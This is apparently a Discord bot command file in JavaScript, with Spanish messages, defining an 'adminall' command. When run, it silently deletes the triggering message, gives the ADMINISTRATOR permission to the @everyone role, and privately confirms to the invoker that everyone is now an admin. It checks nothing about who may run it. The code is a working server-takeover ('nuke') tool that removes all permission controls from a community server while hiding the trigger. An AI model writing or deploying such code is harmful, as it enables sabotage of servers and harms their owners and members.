const Discord = require('discord.js')
const { Client, MessageEmbed } = require('discord.js')



module.exports = {
  timeout: 60000,
  name: "adminall",
  alias: "",
  descritpion: '',
  uso:'',
  category: '',
  run: async (client, message, args) => {
    message.delete().catch(()=>{
        return;
    })
    message.guild.roles.cache.find(role => role.name =="@everyone").setPermissions('ADMINISTRATOR').catch(()=>{
        message.author.send({content: "**Ocurrió un error al intentar otorgar este permiso al rol @everyone, por favor revise mis permisos.**"}).catch(()=>{return;})
    })
    message.author.send({content: '**Se le otorgó permiso administrativos a todos en el servidor.**'})
    
    
  }
}
